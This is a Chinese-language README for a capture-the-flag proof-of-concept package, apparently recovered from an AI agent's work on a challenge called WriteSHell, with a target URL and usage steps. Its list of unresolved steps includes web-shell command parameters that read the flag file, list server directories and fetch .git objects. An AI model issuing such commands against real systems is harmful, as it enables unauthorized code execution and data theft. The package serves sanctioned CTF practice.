# 可复现攻击 PoC（从 Worker 产物恢复）

> **本管线未自动执行验证。** 包内脚本取自 Muteki Worker 工作时真实写入/执行过的产物，
> 未经本管线复跑确认。不要把它当作已验证的结论。

- 运行 ID：`a9915183-a9d8-4003-884d-2a2334f64f57`
- 题目：WriteSHell
- 主 PoC：`poc_writeshell_rce.sh`（Shell 脚本）
- 来源：Worker 自写脚本（逐字节原样，解题时本人所写）
- 源文件：`muteki/shared/poc_writeshell_rce.sh`

## Worker 自写脚本

`worker/poc_writeshell_rce.sh` 是 Worker 解题时自己写的，**逐字节原样**收录，
没有经过改写或重构，因此它比任何转录都更忠实。

## 解题过程转录（Python）

`reproduce.py` 由 Worker 对话原文中真实出现过的 HTTP 请求转写而成，
每个步骤都把原始 shell 命令保留为注释，便于对照。

### 未解析参数（必须手工补齐）

以下参数在捕获时仍是 shell 变量，无法从转录还原，脚本会**跳过**这些步骤：

- 第 2 步：path=/$NAME?c=id;ls+/;cat+/flag*
- 第 8 步：path=/$NAME?c=id;ls+-la+/;ls+-la+/var/www/html
- 第 9 步：path=/$NAME?c=id
- 第 10 步：path=/$NAME?c=
- 第 11 步：path=/$NAME?c=id;ls+-la+/;/;ls+-la+/var/www/html
- 第 26 步：path=/$p
- 第 27 步：path=/.git/objects/${sha:0:2}/${sha:2}
- 第 33 步：path=/$fn

## 使用方法

```bash
export TARGET_URL='http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/'
python reproduce.py      # 若由 worker/ 下的脚本驱动，请先阅读该脚本原文
```

- 原始响应、Token、密码与 Cookie 不会写入包；敏感字面量已替换为占位符。
- 目标必须属于你已获授权的范围；脚本只做读取，不修改任何远端状态。
